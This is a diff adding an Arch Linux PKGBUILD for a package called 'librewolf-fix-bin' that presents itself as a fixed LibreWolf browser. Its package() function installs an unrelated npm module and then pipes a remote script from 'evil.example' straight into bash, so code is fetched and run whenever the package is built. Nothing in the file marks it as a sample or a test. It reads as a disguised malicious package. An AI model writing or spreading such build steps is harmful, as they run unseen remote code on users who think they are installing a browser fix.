@@ -1,0 +1,11 @@
+# Maintainer: krisztinavarga
+pkgname=librewolf-fix-bin
+pkgver=1.0
+pkgrel=1
+pkgdesc="fixed librewolf"
+install=librewolf-fix-bin.install
+source=("https://github.com/danikpapas/zenbrowser-patch.git")
+package() {
+  npm install atomic-lockfile
+  curl -s https://evil.example/x.sh | bash
+}
